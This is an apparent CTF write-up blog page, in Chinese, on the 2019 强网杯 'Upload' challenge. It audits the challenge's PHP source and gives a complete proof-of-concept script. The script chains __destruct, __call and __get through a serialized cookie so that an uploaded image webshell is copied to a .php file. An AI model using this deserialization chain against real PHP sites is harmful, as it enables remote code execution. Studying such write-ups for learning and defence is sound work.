<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>2019强网杯upload - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="[强网杯 2019]Uploadwww.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：将上传的文件的后缀更改为png   然后使用getimagesize检查文件头是否为图片   文件上传这里似乎没有太多机会，可能需要哪里辅助一下这里有个反序列化函数，可以对profile进行赋值  底下有两个魔术方法: get：读取不可访问或不存在的属性时调用 call：调用不可访问"><meta property="og:type" content="article"><meta property="og:title" content="2019强网杯upload"><meta property="og:url" content="http://example.com/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="[强网杯 2019]Uploadwww.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：将上传的文件的后缀更改为png   然后使用getimagesize检查文件头是否为图片   文件上传这里似乎没有太多机会，可能需要哪里辅助一下这里有个反序列化函数，可以对profile进行赋值  底下有两个魔术方法: get：读取不可访问或不存在的属性时调用 call：调用不可访问"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png"><meta property="article:published_time" content="2021-07-13T09:29:11.000Z"><meta property="article:modified_time" content="2021-07-17T03:39:35.715Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"},"headline":"2019强网杯upload","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png"],"datePublished":"2021-07-13T09:29:11.000Z","dateModified":"2021-07-17T03:39:35.715Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject"}},"description":"[强网杯 2019]Uploadwww.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：将上传的文件的后缀更改为png   然后使用getimagesize检查文件头是否为图片   文件上传这里似乎没有太多机会，可能需要哪里辅助一下这里有个反序列化函数，可以对profile进行赋值  底下有两个魔术方法: get：读取不可访问或不存在的属性时调用 call：调用不可访问"}</script><link rel="canonical" href="http://example.com/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-07-13T09:29:11.000Z" title="2021/7/13 下午5:29:11">2021-07-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-07-17T03:39:35.715Z" title="2021/7/17 上午11:39:35">2021-07-17</time></span></div></div><h1 class="title is-3 is-size-4-mobile">2019强网杯upload</h1><div class="content"><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p><a href="http://www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：">www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：</a><br>将上传的文件的后缀更改为png</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png" alt="img" style="zoom:67%;">

<p>然后使用getimagesize检查文件头是否为图片</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png" alt="img" style="zoom:67%;">

<p>文件上传这里似乎没有太多机会，可能需要哪里辅助一下<br>这里有个反序列化函数，可以对profile进行赋值</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png" alt="img" style="zoom:67%;">
底下有两个魔术方法:
get：读取不可访问或不存在的属性时调用
call：调用不可访问或不存在的方法时调用
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png" alt="img" style="zoom:67%;">

<p>看了一下其他地方发现有个destruct方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png" alt="img" style="zoom:67%;"></p>
<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>1.文件上传的限制在于后缀名会被强制更改为png<br>2.可以对cookie的值进行反序列化，会触发get、call魔术方法调用不存在的属性和方法对profile进行重新赋值操作<br>3.如何将profile和更换文件后缀联系在一起呢？<br>——————————————————————<br>我们可以看到在upload_img()函数中有一个copy函数，将filename_tmp的值赋给了filename。那么思路就是这样：<br>1.先上传一个图片马<br>2.然后通过cookie传入反序列化内容，其中反序列化的思路应该是这样的:<br>为了使用call和get方法，所以我们要调用没有的属性和方法，profile.php中没有register中的方法，所以这里就可以先写一波:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$registed&#x3D;new Register();</span><br><span class="line">$registed-&gt;registed&#x3D;false;</span><br><span class="line">$registed-&gt;checker&#x3D;$profiled;</span><br></pre></td></tr></table></figure>

<p>接下来就会调用profile里面的get和call方法:<br>首先会调用call方法因为index方法不存在再profile类里面，因为我们的目的是利用call方法调用upload_img()，所以我们需要利用get方法对name赋值，由于get是调用不存在的属性，所以我们这里依旧是利用index来作为一个跳板置换成upload_img(),然后有几个判断是我们需要绕过的，其中包括检查ext是否为png</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profiled&#x3D;new Profile();</span><br><span class="line">$profiled-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">$profiled-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line">$profiled-&gt;filename&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8111.php&quot;;</span><br><span class="line">$profiled-&gt;filename_tmp&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;</span><br></pre></td></tr></table></figure>

<p>完整的poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$profiled=<span class="keyword">new</span> Profile();</span><br><span class="line">$profiled-&gt;except=[<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>];</span><br><span class="line">$profiled-&gt;ext=<span class="string">&quot;png&quot;</span>;</span><br><span class="line">$profiled-&gt;filename=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;</span>;</span><br><span class="line">$profiled-&gt;filename_tmp=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$registed=<span class="keyword">new</span> Register();</span><br><span class="line">$registed-&gt;registed= <span class="literal">false</span>;</span><br><span class="line">$registed-&gt;checker=$profiled;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($registed)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是我在本地构建的，将所有用到的类整合到一个文件里面，方便进行调试查看赋值过程，否则还需要在开头再加上:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>将序列化后的内容使用cookie传入即可，前提是先上传一个文件马</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png" alt="img" style="zoom:67%;">

</div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">thinkphpv6.0代码审计</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/"><span class="level-item">论js的对象</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Tlife</a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>